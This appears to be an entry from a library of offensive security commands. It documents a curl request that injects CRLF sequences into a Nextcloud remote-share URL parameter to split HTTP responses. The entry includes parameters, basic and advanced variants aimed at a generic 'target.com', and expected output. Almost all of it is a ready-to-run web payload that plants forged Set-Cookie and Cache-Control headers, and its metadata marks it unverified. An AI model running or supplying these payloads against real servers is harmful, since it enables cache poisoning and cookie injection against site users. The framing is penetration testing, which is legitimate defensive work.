---
data: >-
  curl -X POST 'https://nextcloud.example.com/remote.php/dav/shares' -u
  'username:password' -d 'path=/testfile.txt' -d
  'url=http://evil.com%0d%0aCache-Control: no-cache%0d%0aSet-Cookie: poisoned=1'
tags:
  - web-exploit
  - crlf-injection
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 6cc76810-25f5-43ad-a711-1b62cc11598b
created_at: '2025-12-14T17:29:20.238Z'
updated_at: '2025-12-14T17:29:20.238Z'
verified: false
validated: true
submitted: true
---
# curl-crlf-payload

## Command

```bash
curl -X POST 'https://nextcloud.example.com/remote.php/dav/shares' -u 'username:password' -d 'path=/testfile.txt' -d 'url=http://evil.com%0d%0aCache-Control: no-cache%0d%0aSet-Cookie: poisoned=1'
```

## Description

This curl command simulates creating a remote share in Nextcloud via its WebDAV API, injecting a CRLF payload in the URL parameter to exploit response splitting. Use it to test vulnerability without relying on the UI, authenticating with basic auth and posting the malicious data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method for share creation | Yes |
| `'https://nextcloud.example.com/remote.php/dav/shares'` | Target endpoint for shares | Yes |
| `-u 'username:password'` | Basic authentication credentials | Yes |
| `-d 'path=/testfile.txt'` | Path of the file to share | Yes |
| `-d 'url=...'` | Malicious URL with %0d%0a for CRLF injection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/remote.php/dav/shares' -u 'user:pass' -d 'url=http://evil.com%0d%0aHeader: Value'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/remote.php/dav/shares' -u 'user:pass' -d 'path=/file' -d 'url=http://evil.com%0d%0aSet-Cookie: test=1%0d%0aCache-Control: private' -v
```

## Expected Output

HTTP/1.1 201 Created with XML response indicating share creation, but verbose mode (-v) reveals injected headers in the full exchange. No errors if vulnerable; check server logs for splitting effects.

## Related

- [[Related Procedure: Exploit-CRLF-Injection-in-Nextcloud-Remote-Share]]
